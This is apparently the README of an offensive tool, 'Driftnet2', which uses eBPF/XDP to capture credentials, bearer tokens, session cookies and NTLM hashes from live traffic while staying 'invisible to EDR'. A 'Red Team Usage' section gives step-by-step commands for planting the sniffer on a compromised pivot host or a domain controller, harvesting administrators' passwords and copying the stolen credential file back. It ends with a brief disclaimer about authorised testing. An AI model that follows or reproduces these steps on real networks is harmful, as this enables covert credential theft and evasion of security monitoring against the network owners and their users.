# Driftnet2 — Kernel-Level Network Sniffing & Credential Extraction

**Silently capture credentials, tokens, and session cookies from live network traffic — at the kernel level, invisible to EDR.**

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![eBPF](https://img.shields.io/badge/eBPF-Linux%205.8+-orange)](https://ebpf.io)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

Driftnet2 is a modern reincarnation of the classic [driftnet](https://github.com/deiv/driftnet) tool — but instead of just capturing images, it extracts **credentials, tokens, hashes, and detects DNS tunnels** from network traffic. It operates at two levels:

- **eBPF/XDP mode** (Linux 5.8+) — hooks into the kernel before userspace sees the packet. No `/proc/net/packet`, no socket, invisible to EDR.
- **AF_PACKET mode** (Linux, macOS, BSD) — standard libpcap fallback for anywhere.

```
┌─────────────────────────────────────────────────────────┐
│ driftnet2 v1.0  │  eth0     │  XDP       │  pkts: 12,847│
├─────────────────────────────────────────────────────────┤
│ 14:32:05 HTTP  10.0.0.15       → 192.168.1.100:443     │
│   🔑 admin:Spring2026!                                    │
│   🍪 session=eyJhbGciOiJS...                              │
│ 14:32:12 SMB   10.0.0.15       → 10.0.0.5:445          │
│   ⚡ admin::DOMAIN:aabbccdd...                            │
│ 14:32:18 DNS   10.0.0.15       → 8.8.8.8:53            │
│   🕳️  TUNNEL: B64data.c2.example.com                     │
├─────────────────────────────────────────────────────────┤
│ Credentials: 3  │ Sessions: 2  │ Tunnels: 1  │ 4m12s   │
└─────────────────────────────────────────────────────────┘
```

## What it extracts

| Protocol | Credential Type | Example |
|----------|----------------|---------|
| **HTTP** | Basic Auth (`Authorization: Basic`) | `admin:password` |
| **HTTP** | POST forms (`username + password`) | `admin:Spring2026!` |
| **HTTP** | Bearer tokens (`Authorization: Bearer`) | `eyJhbGciOi...` |
| **HTTP** | Session cookies (`Cookie: session=`) | `session=abc123` |
| **SMB** | NTLMv2 challenge hash | `admin::DOMAIN:hash` |
| **LDAP** | Simple bind credentials | `cn=admin:password` |
| **DNS** | Tunnel detection (long subdomain queries) | `data.ns.c2.com` |

## Quick Start

```bash
# Build
go build -o driftnet2 ./cmd/driftnet2

# macOS — sniff WiFi
./driftnet2 -iface en0

# Linux — sniff ethernet
./driftnet2 -iface eth0

# HTTP credentials only
./driftnet2 -iface en0 --proto http

# Export to JSON
./driftnet2 -iface eth0 -output creds.json
```

### Linux eBPF/XDP mode (EDR-invisible)

```bash
# 1. Compile eBPF program
make bpf          # requires clang

# 2. Build + run
make build
sudo ./driftnet2 -iface eth0     # auto-uses XDP if bpf/xdp_sniff.o exists

# XDP hooks at kernel level — zero userspace footprint
# /proc/net/packet shows nothing
# EDR/XDR sees nothing
```

## Architecture

```
                  ┌─────────────────────┐
                  │    NETWORK CARD     │
                  └──────────┬──────────┘
                             │
              ┌──────────────▼──────────────┐
              │     eBPF XDP Hook (kernel)  │  ← kernel seviyesi
              │  filter → ring buffer       │     EDR görmez
              └──────────────┬──────────────┘
                             │ perf ring buffer
              ┌──────────────▼──────────────┐
              │     Go Userspace            │
              │  ┌──────────────────────┐   │
              │  │ Protocol Parsers      │   │
              │  │ HTTP DNS SMB LDAP    │   │
              │  └──────────┬───────────┘   │
              │             ▼               │
              │  ┌──────────────────────┐   │
              │  │ Credential Extract   │   │
              │  │ regex + pattern      │   │
              │  └──────────┬───────────┘   │
              │             ▼               │
              │  ┌──────────────────────┐   │
              │  │ TUI / JSON / PCAP    │   │
              │  └──────────────────────┘   │
              └─────────────────────────────┘
```

## Red Team Usage

### Scenario 1: Pivot point sniffing

```bash
# You've compromised a dual-homed host. Deploy driftnet2.
scp driftnet2 user@pivot:/tmp/driftnet2

# Sniff the internal interface, export to JSON
ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
sleep 300  # 5 minutes
scp user@pivot:/tmp/creds.json .
ssh user@pivot "sudo pkill driftnet2"

# Now you have cleartext passwords + NTLM hashes from internal traffic
```

### Scenario 2: Catch the admin

```bash
# Deploy on a domain controller or file server
./driftnet2 -iface eth0 --proto http,smb -output admin-hunt.json

# Wait for IT admin to log into web console or map a drive
# → Their password appears in your terminal
```

### Scenario 3: DNS tunnel detection

```bash
# Monitor for covert channels leaving your target network
./driftnet2 -iface eth0 --proto dns

# Detects:
#   🕳️  TUNNEL: b64payload.c2.example.com
#   🕳️  TUNNEL: AQIDBAUG.malware-cdn.net
```

## Comparison

| Tool | Credential Extraction | Kernel Sniffing | EDR Invisible | Maintained |
|------|:---:|:---:|:---:|:---:|
| **driftnet2** | ✓ (4 protocols) | ✓ (eBPF XDP) | ✓ | 2026 |
| driftnet (2001) | — | — | — | — |
| bettercap | ✓ (HTTP) | — | — | ✓ |
| pcredz | ✓ (offline only) | — | — | 2015 |
| net-creds | ✓ | — | — | 2014 |
| wireshark/tshark | — (manual) | — | — | ✓ |

## Project Structure

```
driftnet2/
├── bpf/xdp_sniff.c          # eBPF XDP C program (130 LoC)
├── cmd/driftnet2/main.go    # CLI entry point
├── pkg/
│   ├── ebpf/loader.go       # cilium/ebpf loader + ring buffer
│   ├── sniffer/sniffer.go   # pcap live + offline reader
│   ├── protocol/protocol.go # HTTP/DNS/SMB/LDAP parsers
│   └── output/
│       ├── tui.go           # Terminal dashboard
│       └── json.go          # JSON export
├── Makefile
└── README.md
```

## Disclaimer

This tool is for **authorized penetration testing, red team assessments, and security research only**. Capturing network traffic without explicit authorization is illegal. The author assumes no liability for misuse.

## License

MIT
